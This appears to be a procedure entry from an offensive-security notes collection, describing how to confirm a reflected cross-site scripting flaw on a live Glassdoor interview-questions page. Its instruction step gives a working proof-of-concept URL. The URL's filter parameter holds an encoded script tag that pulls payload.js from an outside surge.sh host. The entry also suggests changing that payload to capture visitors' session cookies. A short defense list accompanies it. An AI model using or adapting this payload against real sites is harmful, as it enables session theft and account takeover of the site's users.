---
tags:
  - payload-execution
  - impact-verification
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:15.811Z'
sub_techniques: []
id: 7eae6ad6-ac80-4cd7-9e87-eaaa7e4cc57f
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Observe-Payload-Execution-and-Impact

## Summary

This procedure verifies the execution of the injected XSS payload on Glassdoor's page, observing alerts, script loads, and potential impacts like cookie theft or redirection.

## Description

Upon loading the payload URL, the reflected script executes in the browser, fetching and running external JavaScript. This demonstrates the vulnerability's severity, allowing attackers to steal session cookies (e.g., via document.cookie) or redirect to phishing sites. Tested on Chrome and Firefox.

## Requirements

1. Loaded PoC URL from previous step
2. Browser dev tools open for inspection
3. Victim-like session (e.g., logged-in user for cookie impact)

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected script executions or external fetches in browser logs
- Use client-side monitoring to detect anomalous alerts or redirects
- Implement HttpOnly flags on cookies to prevent JS access

## Objectives

1. Confirm JavaScript execution via alert or console
2. Validate impact on user data (cookies, sessions)
3. Assess redirection potential

## Instructions

### Step 1: Load and Inspect

**Context**: Navigate to the PoC URL and observe runtime behavior.

Enter or refresh the URL in the browser:

```url
https://www.glassdoor.com/Interview/Accenture-Interview-Questions-E4138.htm?filter.jobTitleFTS=%3c%3c%3ca%3ea%3escript%20SrC%3d%22%68%74%74%70s%3a%2f%2f%73%6b%69%6e%6e%79%2d%66%65%61%72%2e%73%75%72%67%65%2e%73%68%2f%70%61%79%6c%6f%61%64%2e%6a%73%22%3e%3c%3c%3ca%3ea%3e%2fscript%3e&countryRedirect=true
```

> An alert should pop from payload.js. Check network tab for the fetch to skinny-fear.surge.sh. For theft, modify payload to log document.cookie.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[payload-execution]]
- [[impact-verification]]
- [[cookie-theft]]
